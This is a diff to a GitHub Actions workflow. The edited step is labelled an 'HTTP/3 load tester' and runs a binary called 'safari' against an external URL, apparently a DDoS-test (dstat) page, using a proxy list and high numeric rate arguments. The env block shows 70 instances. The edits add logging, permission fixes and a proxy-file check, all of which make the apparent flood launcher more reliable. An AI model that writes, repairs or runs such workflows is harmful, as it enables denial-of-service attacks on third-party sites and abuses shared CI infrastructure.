@@ -32,7 +32,7 @@ jobs:
       
       - name: Install dependencies
         run: |
-          ls
+          ls -la
           
       - name: Install Node.js dependencies
         run:  |
@@ -40,12 +40,25 @@ jobs:
             
       - name: Run HTTP/3 load tester
         run: |
-          # Convert Windows-style line endings (CRLF) to Linux-style (LF)
+          # 1. Print file details to logs for debugging
+          echo "=== Checking Target Binary ==="
+          ls -la ./safari
+          
+          # 2. Fix line endings in case it's a script
           sed -i 's/\r$//' ./safari
           
-          # Make scripts executable and run
-          chmod +x *
-          ./safari https://c1.dstatbot.win/lURlGPR6 700 1000 90 proxies.txt --raw
+          # 3. Grant execute permissions strictly to the target file
+          chmod +x ./safari
+          
+          # 4. Ensure proxy list is present
+          if [ ! -f "proxies.txt" ]; then
+            echo "::error:: proxies.txt is missing from the repository root!"
+            exit 1
+          fi
+          
+          echo "=== Starting Execution ==="
+          # 5. Run the binary and force error output stream redirection
+          ./safari https://c1.dstatbot.win/lURlGPR6 700 1000 90 proxies.txt --raw 2>&1
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
           TOTAL_INSTANCES: 70
